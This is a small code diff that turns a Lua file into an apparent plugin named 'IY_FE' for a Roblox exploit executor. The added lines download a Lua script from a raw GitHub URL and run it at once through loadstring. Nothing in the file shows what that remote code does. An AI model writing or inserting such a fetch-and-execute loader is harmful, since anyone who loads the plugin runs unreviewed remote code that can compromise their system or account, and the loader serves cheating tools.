@@ -1,1 +1,8 @@
-print("aasshh")
+if getgenv and not getgenv().IYFELOADED then
+    getgenv().IYFELOADED = true
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MarksNewHat98/scripts/refs/heads/main/stuf.lua5.1", true))()
+end
+
+return {
+    ["PluginName"] = "IY_FE"
+}
